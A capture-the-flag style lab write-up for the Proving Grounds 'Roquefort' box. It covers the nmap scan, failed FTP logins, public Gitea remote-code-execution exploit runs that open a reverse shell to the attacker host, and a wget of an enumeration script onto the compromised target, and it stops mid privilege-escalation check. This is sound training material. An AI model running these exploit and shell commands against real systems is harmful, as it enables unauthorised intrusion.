# Roquefort

# Enumeration

## nmap

```
# Nmap 7.91 scan initiated Mon Feb 14 08:35:48 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Roquefort/results/192.168.90.67/scans/_full_tcp_nmap.txt" -oX "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Roquefort/results/192.168.90.67/scans/xml/_full_tcp_nmap.xml" 192.168.90.67
Warning: Hit PCRE_ERROR_MATCHLIMIT when probing for service http with the regex '^HTTP/1\.0 404 Not Found\r\n(?:[^<]+|<(?!/head>))*?<style>\nbody \{ background-color: #fcfcfc; color: #333333; margin: 0; padding:0; \}\nh1 \{ font-size: 1\.5em; font-weight: normal; background-color: #9999cc; min-height:2em; line-height:2em; border-bottom: 1px inset black; margin: 0; \}\nh1, p \{ padding-left: 10px; \}\ncode\.url \{ background-color: #eeeeee; font-family:monospace; padding:0 2px;\}\n</style>'
Warning: Hit PCRE_ERROR_MATCHLIMIT when probing for service http with the regex '^HTTP/1\.0 404 Not Found\r\n(?:[^<]+|<(?!/head>))*?<style>\nbody \{ background-color: #ffffff; color: #000000; \}\nh1 \{ font-family: sans-serif; font-size: 150%; background-color: #9999cc; font-weight: bold; color: #000000; margin-top: 0;\}\n</style>'
Warning: Hit PCRE_ERROR_MATCHLIMIT when probing for service http with the regex '^HTTP/1\.0 404 Not Found\r\n(?:[^<]+|<(?!/head>))*?<style>\nbody \{ background-color: #fcfcfc; color: #333333; margin: 0; padding:0; \}\nh1 \{ font-size: 1\.5em; font-weight: normal; background-color: #9999cc; min-height:2em; line-height:2em; border-bottom: 1px inset black; margin: 0; \}\nh1, p \{ padding-left: 10px; \}\ncode\.url \{ background-color: #eeeeee; font-family:monospace; padding:0 2px;\}\n</style>'
Warning: Hit PCRE_ERROR_MATCHLIMIT when probing for service http with the regex '^HTTP/1\.0 404 Not Found\r\n(?:[^<]+|<(?!/head>))*?<style>\nbody \{ background-color: #ffffff; color: #000000; \}\nh1 \{ font-family: sans-serif; font-size: 150%; background-color: #9999cc; font-weight: bold; color: #000000; margin-top: 0;\}\n</style>'
Nmap scan report for 192.168.90.67
Host is up, received user-set (0.18s latency).
Scanned at 2022-02-14 08:35:49 EST for 648s
Not shown: 65530 filtered ports
Reason: 65530 no-responses
PORT     STATE  SERVICE REASON         VERSION
21/tcp   open   ftp     syn-ack ttl 63 ProFTPD 1.3.5b
22/tcp   open   ssh     syn-ack ttl 63 OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:77:6f:b1:ed:65:b5:ad:14:64:40:d2:24:d3:9c:0d (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC9yKoYquj+03HzzDt10Vye2nDsQQYflZqSXlNi4CWbk9++xu69PJEgsm0GMczWto1hEV8SG2hLMvP/2EGg7WU+6Dru695SYZhUHAJfJErXptgw3tbkM4id+civEPOYAqatj0HxF29hRV7DU3UYw6koNhpAmgf+B1zlXS4It3iZR7xOdOcSylKKCd0zJDE8VS8udSddyhugxArCMCbiiZD5y7AJ9/IeQ0Jl+t4n0JxF5tELOifQ4seAGtEi3A8gpYav6E81DG9rIwuZdpOVnh3/nZgkwtcaVymXYUTAMPzwLr1cwK5Jd+OMFy6grAZvhjbDxdnHI7WCXo5HXEhVZVG5
|   256 a9:b4:4f:61:2e:2d:9d:4c:48:15:fe:70:8e:fa:af:b3 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNKcVXu5Q1QIJE/D7O8GWuavg4Thfp3NQsFXiEnrgjgluRdw0ZQ0bi1raXmVymLKiSSzdO4LTVixBiU+hYvMm4g=
|   256 92:56:eb:af:c9:34:af:ea:a1:cf:9f:e1:90:dd:2f:61 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOTR8UgPY9T6exsIAXVoAiNxWupn0Daf+/Hf6gOUv4zv
53/tcp   closed domain  reset ttl 63
2222/tcp open   ssh     syn-ack ttl 63 Dropbear sshd 2016.74 (protocol 2.0)
3000/tcp open   ppp?    syn-ack ttl 63
| fingerprint-strings: 
|   GenericLines, Help: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gitea=35affbe664de4288; Path=/; HttpOnly
|     Set-Cookie: _csrf=PUihvW0U572DUYMB6aIMUMkoVWY6MTY0NDg0NTg4MzMwNDAyNTQwMA%3D%3D; Path=/; Expires=Tue, 15 Feb 2022 13:38:03 GMT; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Mon, 14 Feb 2022 13:38:03 GMT
|     <!DOCTYPE html>
|     <html>
|     <head data-suburl="">
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>Gitea: Git with a cup of tea</title>
|     <link rel="manifest" href="/manifest.json" crossorigin="use-credentials">
|     <script>
|     ('serviceWorker' in navigator) {
|     window.addEventListener('load', function() {
|     navigator.serviceWorker.register('/serviceworker.js').then(function(registration) {
|   HTTPOptions: 
|     HTTP/1.0 404 Not Found
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gitea=3293f2ef9608b726; Path=/; HttpOnly
|     Set-Cookie: _csrf=ePbemUwytfuZoVHcNtkFxzrcF586MTY0NDg0NTg5MTQ2MDEyMDUyMg%3D%3D; Path=/; Expires=Tue, 15 Feb 2022 13:38:11 GMT; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Mon, 14 Feb 2022 13:38:11 GMT
|     <!DOCTYPE html>
|     <html>
|     <head data-suburl="">
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>Page Not Found - Gitea: Git with a cup of tea</title>
|     <link rel="manifest" href="/manifest.json" crossorigin="use-credentials">
|     <script>
|     ('serviceWorker' in navigator) {
|     window.addEventListener('load', function() {
|_    navigator.serviceWorker.register('/serviceworker.js').then(function(registration
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.91%I=9%D=2/14%Time=620A5B9F%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(GetRequest,1000,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:\
SF:x20text/html;\x20charset=UTF-8\r\nSet-Cookie:\x20lang=en-US;\x20Path=/;
SF:\x20Max-Age=2147483647\r\nSet-Cookie:\x20i_like_gitea=35affbe664de4288;
SF:\x20Path=/;\x20HttpOnly\r\nSet-Cookie:\x20_csrf=PUihvW0U572DUYMB6aIMUMk
SF:oVWY6MTY0NDg0NTg4MzMwNDAyNTQwMA%3D%3D;\x20Path=/;\x20Expires=Tue,\x2015
SF:\x20Feb\x202022\x2013:38:03\x20GMT;\x20HttpOnly\r\nX-Frame-Options:\x20
SF:SAMEORIGIN\r\nDate:\x20Mon,\x2014\x20Feb\x202022\x2013:38:03\x20GMT\r\n
SF:\r\n<!DOCTYPE\x20html>\n<html>\n<head\x20data-suburl=\"\">\n\t<meta\x20
SF:charset=\"utf-8\">\n\t<meta\x20name=\"viewport\"\x20content=\"width=dev
SF:ice-width,\x20initial-scale=1\">\n\t<meta\x20http-equiv=\"x-ua-compatib
SF:le\"\x20content=\"ie=edge\">\n\t<title>Gitea:\x20Git\x20with\x20a\x20cu
SF:p\x20of\x20tea</title>\n\t<link\x20rel=\"manifest\"\x20href=\"/manifest
SF:\.json\"\x20crossorigin=\"use-credentials\">\n\t\n\t<script>\n\t\tif\x2
SF:0\('serviceWorker'\x20in\x20navigator\)\x20{\n\x20\x20\t\t\twindow\.add
SF:EventListener\('load',\x20function\(\)\x20{\n\x20\x20\x20\x20\t\t\tnavi
SF:gator\.serviceWorker\.register\('/serviceworker\.js'\)\.then\(function\
SF:(registration\)\x20{\n\x20\x20\x20\x20\x20\x20\t\t\t\t\n\x20\x20\x20\x2
SF:0\x20\x20\t\t\t")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCont
SF:ent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r
SF:\n400\x20Bad\x20Request")%r(HTTPOptions,1FE2,"HTTP/1\.0\x20404\x20Not\x
SF:20Found\r\nContent-Type:\x20text/html;\x20charset=UTF-8\r\nSet-Cookie:\
SF:x20lang=en-US;\x20Path=/;\x20Max-Age=2147483647\r\nSet-Cookie:\x20i_lik
SF:e_gitea=3293f2ef9608b726;\x20Path=/;\x20HttpOnly\r\nSet-Cookie:\x20_csr
SF:f=ePbemUwytfuZoVHcNtkFxzrcF586MTY0NDg0NTg5MTQ2MDEyMDUyMg%3D%3D;\x20Path
SF:=/;\x20Expires=Tue,\x2015\x20Feb\x202022\x2013:38:11\x20GMT;\x20HttpOnl
SF:y\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate:\x20Mon,\x2014\x20Feb\x2020
SF:22\x2013:38:11\x20GMT\r\n\r\n<!DOCTYPE\x20html>\n<html>\n<head\x20data-
SF:suburl=\"\">\n\t<meta\x20charset=\"utf-8\">\n\t<meta\x20name=\"viewport
SF:\"\x20content=\"width=device-width,\x20initial-scale=1\">\n\t<meta\x20h
SF:ttp-equiv=\"x-ua-compatible\"\x20content=\"ie=edge\">\n\t<title>Page\x2
SF:0Not\x20Found\x20-\x20Gitea:\x20Git\x20with\x20a\x20cup\x20of\x20tea</t
SF:itle>\n\t<link\x20rel=\"manifest\"\x20href=\"/manifest\.json\"\x20cross
SF:origin=\"use-credentials\">\n\t\n\t<script>\n\t\tif\x20\('serviceWorker
SF:'\x20in\x20navigator\)\x20{\n\x20\x20\t\t\twindow\.addEventListener\('l
SF:oad',\x20function\(\)\x20{\n\x20\x20\x20\x20\t\t\tnavigator\.serviceWor
SF:ker\.register\('/serviceworker\.js'\)\.then\(function\(registration");
OS fingerprint not ideal because: Didn't receive UDP response. Please try again with -sSU
Aggressive OS guesses: Linux 3.11 - 4.1 (93%), Linux 4.4 (93%), Linux 3.16 (92%), Linux 3.13 (89%), Linux 3.10 - 3.16 (88%), Linux 3.2 - 3.8 (88%), Linux 3.8 (88%), Kyocera CopyStar CS-2560 printer (87%), IPFire 2.11 firewall (Linux 2.6.32) (87%), Linux 2.6.32 (87%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.91%E=4%D=2/14%OT=21%CT=53%CU=%PV=Y%DS=2%DC=T%G=N%TM=620A5D3D%P=x86_64-pc-linux-gnu)
SEQ(SP=107%GCD=1%ISR=107%TI=Z%II=I%TS=8)
OPS(O1=M54EST11NW7%O2=M54EST11NW7%O3=M54ENNT11NW7%O4=M54EST11NW7%O5=M54EST11NW7%O6=M54EST11)
WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)
ECN(R=Y%DF=Y%TG=40%W=7210%O=M54ENNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
T5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=N)
T7(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=40%CD=S)

Uptime guess: 0.012 days (since Mon Feb 14 08:30:00 2022)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 53/tcp)
HOP RTT       ADDRESS
1   178.84 ms 192.168.49.1
2   178.80 ms 192.168.90.67

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Feb 14 08:46:37 2022 -- 1 IP address (1 host up) scanned in 649.90 seconds
```

## 21 - FTP

Failed Credentials

```
anonymous:
admin:admin
admin:password
guest:guest
backup:backup
```

## 3000 - Web - Gitea

![](Pasted%20image%2020220214214647.png)
![](Pasted%20image%2020220214220428.png)

# Exploitation
Gitea Exploit
https://www.google.com/search?q=gitea+1.7.5+exploit+github&sxsrf=APq-WBtWYpXHh_2XtN6x_0N3pU0w5gXa0g%3A1644847390664&ei=HmEKYrKRKIzYz7sPkaiqoAU&oq=gitea+exploit+1.7.&gs_lcp=Cgdnd3Mtd2l6EAEYATIGCAAQFhAeMgYIABAWEB4yBggAEBYQHjoHCAAQRxCwAzoFCAAQgAQ6BQghEKABOgQIIRAVSgQIQRgASgQIRhgAUKADWKoUYKQgaANwAXgBgAHJAYgB2gSSAQU1LjEuMZgBAKABAcgBCMABAQ&sclient=gws-wiz
 - https://www.exploit-db.com/exploits/49383

Create account `test`:`password123`
![](Pasted%20image%2020220214220956.png)
![](Pasted%20image%2020220214221006.png)

Doesn't really work

```
┌──(kali㉿kali)-[/tmp]
└─$ time python3 49383.py
/usr/bin/wget 192.168.49.90:3000
Logging in
Logged in successfully
Retrieving user ID
Retrieved user ID: 1
hint: Using 'master' as the name for the initial branch. This default branch name
hint: is subject to change. To configure the initial branch name to use in all
hint: of your new repositories, which will suppress this warning, call:
hint: 
hint:   git config --global init.defaultBranch <name>
hint: 
hint: Names commonly chosen instead of 'master' are 'main', 'trunk' and
hint: 'development'. The just-created branch can be renamed via this command:
hint: 
hint:   git branch -m <name>
Initialized empty Git repository in /tmp/tmp_iaaays7/.git/
[master (root-commit) 572dff9] x
 1 file changed, 0 insertions(+), 0 deletions(-)
 create mode 100644 x
Cloning into bare repository '/tmp/tmp_iaaays7.git'...
done.
Created temporary git server to host /tmp/tmp_iaaays7.git
Creating repository
192.168.90.67 - - [14/Feb/2022 09:36:17] "GET /tmp_iaaays7.git/info/refs?service=git-upload-pack HTTP/1.1" 200 -
192.168.90.67 - - [14/Feb/2022 09:36:17] "GET /tmp_iaaays7.git/HEAD HTTP/1.1" 200 -
192.168.90.67 - - [14/Feb/2022 09:36:17] "GET /tmp_iaaays7.git/objects/57/2dff97144eacef578382f14f3b2ac03c4e8d15 HTTP/1.1" 200 -
192.168.90.67 - - [14/Feb/2022 09:36:18] "GET /tmp_iaaays7.git/objects/58/05b676e247eb9a8046ad0c4d249cd2fb2513df HTTP/1.1" 200 -
192.168.90.67 - - [14/Feb/2022 09:36:18] "GET /tmp_iaaays7.git/objects/e6/9de29bb2d1d6434b8b29ae775ad8c2e48c5391 HTTP/1.1" 200 -
192.168.90.67 - - [14/Feb/2022 09:36:18] code 404, message File not found
192.168.90.67 - - [14/Feb/2022 09:36:18] "GET /tmp_iaaays7.wiki.git/info/refs?service=git-upload-pack HTTP/1.1" 404 -
192.168.90.67 - - [14/Feb/2022 09:36:19] code 404, message File not found
192.168.90.67 - - [14/Feb/2022 09:36:19] "GET /tmp_iaaays7.git/wiki/info/refs?service=git-upload-pack HTTP/1.1" 404 -
Repo "vdqvjbat" created
Injecting command into repo
Command injected
Triggering command
Command triggered
python3 49383.py  0.23s user 0.06s system 4% cpu 6.668 total
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 
```

## Other CVE
https://podalirius.net/en/articles/exploiting-cve-2020-14144-gitea-authenticated-remote-code-execution/

```
┌──(kali㉿kali)-[/tmp]
└─$ wget https://podalirius.net/en/articles/exploiting-cve-2020-14144-gitea-authenticated-remote-code-execution/gitea_CVE-2020-14144.py
--2022-02-14 09:37:30--  https://podalirius.net/en/articles/exploiting-cve-2020-14144-gitea-authenticated-remote-code-execution/gitea_CVE-2020-14144.py
Resolving podalirius.net (podalirius.net)... 5.189.128.92
Connecting to podalirius.net (podalirius.net)|5.189.128.92|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 9372 (9.2K) [text/x-python]
Saving to: ‘gitea_CVE-2020-14144.py’

gitea_CVE-2020-14144.py                   100%[=====================================================================================>]   9.15K  --.-KB/s    in 0s      

2022-02-14 09:37:32 (137 MB/s) - ‘gitea_CVE-2020-14144.py’ saved [9372/9372]

                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ python gitea_CVE-2020-14144.py 
Traceback (most recent call last):
  File "gitea_CVE-2020-14144.py", line 20, in <module>
    import pexpect
ImportError: No module named pexpect
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ python3 gitea_CVE-2020-14144.py                                                                                                                                 1 ⨯
    _____ _ _______
   / ____(_)__   __|             CVE-2020-14144
  | |  __ _   | | ___  __ _
  | | |_ | |  | |/ _ \/ _` |     Authenticated Remote Code Execution
  | |__| | |  | |  __/ (_| |
   \_____|_|  |_|\___|\__,_|     GiTea versions >= 1.1.0 to <= 1.12.5
     
usage: gitea_CVE-2020-14144.py [-h] [-v] -t TARGET -u USERNAME -p PASSWORD [-I REV_IP] [-P REV_PORT] [-f PAYLOAD_FILE]
gitea_CVE-2020-14144.py: error: the following arguments are required: -t/--target, -u/--username, -p/--password
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ python3 gitea_CVE-2020-14144.py -u test -p password123 -t http://192.168.90.67:3000 -I 192.168.49.90 -P 3000                                                    2 ⨯
    _____ _ _______
   / ____(_)__   __|             CVE-2020-14144
  | |  __ _   | | ___  __ _
  | | |_ | |  | |/ _ \/ _` |     Authenticated Remote Code Execution
  | |__| | |  | |  __/ (_| |
   \_____|_|  |_|\___|\__,_|     GiTea versions >= 1.1.0 to <= 1.12.5
     
[+] Starting exploit ...
hint: Using 'master' as the name for the initial branch. This default branch name
hint: is subject to change. To configure the initial branch name to use in all
hint: of your new repositories, which will suppress this warning, call:
hint: 
hint:   git config --global init.defaultBranch <name>
hint: 
hint: Names commonly chosen instead of 'master' are 'main', 'trunk' and
hint: 'development'. The just-created branch can be renamed via this command:
hint: 
hint:   git branch -m <name>
Initialized empty Git repository in /tmp/tmp.eiwr5EdKyl/.git/
Author identity unknown

*** Please tell me who you are.

Run

  git config --global user.email "you@example.com"
  git config --global user.name "Your Name"

to set your account's default identity.
Omit --global to set the identity only in this repository.

fatal: unable to auto-detect email address (got 'kali@kali.(none)')
Traceback (most recent call last):
  File "/tmp/gitea_CVE-2020-14144.py", line 246, in <module>
    trigger_exploit(g.host, g.username, g.password, reponame, verbose=args.verbose)
  File "/tmp/gitea_CVE-2020-14144.py", line 185, in trigger_exploit
    conn.expect("Username for .*: ")
  File "/usr/lib/python3/dist-packages/pexpect/spawnbase.py", line 343, in expect
    return self.expect_list(compiled_pattern_list,
  File "/usr/lib/python3/dist-packages/pexpect/spawnbase.py", line 372, in expect_list
    return exp.expect_loop(timeout)
  File "/usr/lib/python3/dist-packages/pexpect/expect.py", line 179, in expect_loop
    return self.eof(e)
  File "/usr/lib/python3/dist-packages/pexpect/expect.py", line 122, in eof
    raise exc
pexpect.exceptions.EOF: End Of File (EOF). Exception style platform.
<pexpect.pty_spawn.spawn object at 0x7fb74d752b20>
command: /bin/bash
args: ['/bin/bash', '-c', 'cd /tmp/tmp.eiwr5EdKyl && git push -u origin master']
buffer (last 100 chars): b''
before (last 100 chars): b"ot match any\r\n\x1b[31merror: failed to push some refs to 'http://192.168.90.67:3000/test/vuln.git'\r\n\x1b[m"
after: <class 'pexpect.exceptions.EOF'>
match: None
match_index: None
exitstatus: None
flag_eof: True
pid: 10155
child_fd: 6
closed: False
timeout: 30
delimiter: <class 'pexpect.exceptions.EOF'>
logfile: None
logfile_read: None
logfile_send: None
maxread: 2000
ignorecase: False
searchwindowsize: None
delaybeforesend: 0.05
delayafterclose: 0.1
delayafterterminate: 0.1
searcher: searcher_re:
    0: re.compile(b'Username for .*: ')
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$  git config --global user.email "you@example.com"                                                                                                               1 ⨯

                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ git config --global user.name "Your Name"
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ python3 gitea_CVE-2020-14144.py -u test -p password123 -t http://192.168.90.67:3000 -I 192.168.49.90 -P 3000
    _____ _ _______
   / ____(_)__   __|             CVE-2020-14144
  | |  __ _   | | ___  __ _
  | | |_ | |  | |/ _ \/ _` |     Authenticated Remote Code Execution
  | |__| | |  | |  __/ (_| |
   \_____|_|  |_|\___|\__,_|     GiTea versions >= 1.1.0 to <= 1.12.5
     
[+] Starting exploit ...
hint: Using 'master' as the name for the initial branch. This default branch name
hint: is subject to change. To configure the initial branch name to use in all
hint: of your new repositories, which will suppress this warning, call:
hint: 
hint:   git config --global init.defaultBranch <name>
hint: 
hint: Names commonly chosen instead of 'master' are 'main', 'trunk' and
hint: 'development'. The just-created branch can be renamed via this command:
hint: 
hint:   git branch -m <name>
Initialized empty Git repository in /tmp/tmp.ScJI7qWpSn/.git/
[master (root-commit) 3576b04] Initial commit
 1 file changed, 1 insertion(+)
 create mode 100644 README.md
Enumerating objects: 3, done.
Counting objects: 100% (3/3), done.
Writing objects: 100% (3/3), 246 bytes | 246.00 KiB/s, done.
[+] Exploit completed !
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 
```

```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 3000                                                                                                                                                   1 ⨯
listening on [any] 3000 ...
connect to [192.168.49.90] from (UNKNOWN) [192.168.90.67] 53868
bash: cannot set terminal process group (776): Inappropriate ioctl for device
bash: no job control in this shell
chloe@roquefort:~/gitea-repositories/test/vuln.git$ cd /home/
cd /home/
chloe@roquefort:/home$ ls
ls
chloe
chloe@roquefort:/home$ cd chloe
cd chloe
chloe@roquefort:~$ ls
ls
gitea-repositories
local.txt
chloe@roquefort:~$ cat local.txt
cat local.txt
3ab5700374aa6877ecb2cf88776138d2
chloe@roquefort:~$ ifconfig
ifconfig
ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.90.67  netmask 255.255.255.0  broadcast 192.168.90.255
        ether 00:50:56:ba:c0:fa  txqueuelen 1000  (Ethernet)
        RX packets 233299  bytes 17151786 (16.3 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 113832  bytes 188713493 (179.9 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1  (Local Loopback)
        RX packets 152868  bytes 132039636 (125.9 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 152868  bytes 132039636 (125.9 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

chloe@roquefort:~$ 
```

![](Pasted%20image%2020220214224243.png)

# Privesc

## lse

```
chloe@roquefort:/tmp$ wget 192.168.49.90:3000/lse.sh
wget 192.168.49.90:3000/lse.sh
--2022-02-14 09:42:55--  http://192.168.49.90:3000/lse.sh
Connecting to 192.168.49.90:3000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 43570 (43K) [text/x-sh]
Saving to: ‘lse.sh’

     0K .......... .......... .......... .......... ..        100% 92.0K=0.5s

2022-02-14 09:42:56 (92.0 KB/s) - ‘lse.sh’ saved [43570/43570]

chloe@roquefort:/tmp$ chmod +x lse.sh
chmod +x lse.sh
chloe@roquefort:/tmp$ ./lse.sh
./lse.sh
---
If you know the current user password, write it here to check sudo privileges:                                                                                          
---
                                                                                                                                                                        
 LSE Version: 3.7                                                                                                                                                       

        User: chloe
     User ID: 1000
    Password: none
        Home: /home/chloe
        Path: /usr/lib/git-core:/usr/lib/git-core:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
       umask: 0022

    Hostname: roquefort
       Linux: 4.9.0-12-amd64
Distribution: Debian GNU/Linux 9.12 (stretch)
Architecture: x86_64

==================================================================( users )=====
[i] usr000 Current user groups............................................. yes!
[*] usr010 Is current user in an administrative group?..................... nope
[*] usr020 Are there other users in administrative groups?................. nope
[*] usr030 Other users with shell.......................................... yes!
[i] usr040 Environment information......................................... skip
[i] usr050 Groups for other users.......................................... skip                                                                                        
[i] usr060 Other users..................................................... skip                                                                                        
[*] usr070 PATH variables defined inside /etc.............................. yes!                                                                                        
[!] usr080 Is '.' in a PATH variable defined inside /etc?.................. nope
===================================================================( sudo )=====
[!] sud000 Can we sudo without a password?................................. nope
[!] sud010 Can we list sudo commands without a password?................... nope
[*] sud040 Can we read sudoers files?...................................... nope
[*] sud050 Do we know if any other users used sudo?........................ nope
============================================================( file system )=====
[*] fst000 Writable files outside user's home.............................. yes!
[*] fst010 Binaries with setuid bit........................................ yes!
[!] fst020 Uncommon setuid binaries........................................ nope
[!] fst030 Can we write to any setuid binary?.............................. nope
[*] fst040 Binaries with setgid bit........................................ skip
[!] fst050 Uncommon setgid binaries........................................ skip                                                                                        
[!] fst060 Can we write to any setgid binary?.............................. skip                                                                                        
[*] fst070 Can we read /root?.............................................. nope                                                                                        
[*] fst080 Can we read subdirectories under /home?......................... nope
[*] fst090 SSH files in home directories................................... nope
[*] fst100 Useful binaries................................................. yes!
[*] fst110 Other interesting files in home directories..................... nope
[!] fst120 Are there any credentials in fstab/mtab?........................ nope
[*] fst130 Does 'chloe' have mail?......................................... nope
[!] fst140 Can we access other users mail?................................. nope
[*] fst150 Looking for GIT/SVN repositories................................ nope
[!] fst160 Can we write to critical files?................................. nope
[!] fst170 Can we write to critical directories?........................... nope
[!] fst180 Can we write to directories from PATH defined in /etc?.......... yes!
---
drwxrwsrwx 2 root staff 4096 Apr 24  2020 /usr/local/bin
---
[!] fst190 Can we read any backup?......................................... nope
[!] fst200 Are there possible credentials in any shell history file?....... nope
[!] fst210 Are there NFS exports with 'no_root_squash' option?............. nope
[*] fst220 Are there NFS exports with 'no_all_squash' option?.............. nope
[i] fst500 Files owned by user 'chloe'..................................... skip
[i] fst510 SSH files anywhere.............................................. skip                                                                                        
[i] fst520 Check hosts.equiv file and its contents......................... skip                                                                                        
[i] fst530 List NFS server shares.......................................... skip                                                                                        
[i] fst540 Dump fstab file................................................. skip                                                                                        
=================================================================( system )=====                                                                                        
[i] sys000 Who is logged in................................................ skip
[i] sys010 Last logged in users............................................ skip                                                                                        
[!] sys020 Does the /etc/passwd have hashes?............................... nope                                                                                        
[!] sys022 Does the /etc/group have hashes?................................ nope
[!] sys030 Can we read shadow files?....................................... nope
[*] sys040 Check for other superuser accounts.............................. nope
[*] sys050 Can root user log in via SSH?................................... yes!
[i] sys060 List available shells........................................... skip
[i] sys070 System umask in /etc/login.defs................................. skip                                                                                        
[i] sys080 System password policies in /etc/login.defs..................... skip                                                                                        
===============================================================( security )=====                                                                                        
[*] sec000 Is SELinux present?............................................. nope
[*] sec010 List files with capabilities.................................... nope
[!] sec020 Can we write to a binary with caps?............................. nope
[!] sec030 Do we have all caps in any binary?.............................. nope
[*] sec040 Users with associated capabilities.............................. nope
[!] sec050 Does current user have capabilities?............................ skip
[!] sec060 Can we read the auditd log?..................................... nope                                                                                        
========================================================( recurrent tasks )=====
[*] ret000 User crontab.................................................... nope
[!] ret010 Cron tasks writable by user..................................... nope
[*] ret020 Cron jobs....................................................... yes!
[*] ret030 Can we read user crontabs....................................... nope
[*] ret040 Can we list other user cron tasks?.............................. nope
[*] ret050 Can we write to any paths present in cron jobs.................. yes!
[!] ret060 Can we write to executable paths present in cron jobs........... yes!
---
/etc/crontab:PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
---
[i] ret400 Cron files...................................................... skip
[*] ret500 User systemd timers............................................. nope                                                                                        
[!] ret510 Can we write in any system timer?............................... nope
[i] ret900 Systemd timers.................................................. skip
================================================================( network )=====                                                                                        
[*] net000 Services listening only on localhost............................ yes!
[!] net010 Can we sniff traffic with tcpdump?.............................. nope
[i] net500 NIC and IP information.......................................... skip
[i] net510 Routing table................................................... skip                                                                                        
[i] net520 ARP table....................................................... skip                                                                                        
[i] net530 Nameservers..................................................... skip                                                                                        
[i] net540 Systemd Nameservers............................................. skip                                                                                        
[i] net550 Listening TCP................................................... skip                                                                                        
[i] net560 Listening UDP................................................... skip                                                                                        
===============================================================( services )=====                                                                                        
[!] srv000 Can we write in service files?.................................. nope
[!] srv010 Can we write in binaries executed by services?.................. nope
[*] srv020 Files in /etc/init.d/ not belonging to root..................... nope
[*] srv030 Files in /etc/rc.d/init.d not belonging to root................. nope
[*] srv040 Upstart files not belonging to root............................. nope
[*] srv050 Files in /usr/local/etc/rc.d not belonging to root.............. nope
[i] srv400 Contents of /etc/inetd.conf..................................... skip
[i] srv410 Contents of /etc/xinetd.conf.................................... skip                                                                                        
[i] srv420 List /etc/xinetd.d if used...................................... skip                                                                                        
[i] srv430 List /etc/init.d/ permissions................................... skip                                                                                        
[i] srv440 List /etc/rc.d/init.d permissions............................... skip                                                                                        
[i] srv450 List /usr/local/etc/rc.d permissions............................ skip                                                                                        
[i] srv460 List /etc/init/ permissions..................................... skip                                                                                        
[!] srv500 Can we write in systemd service files?.......................... nope                                                                                        
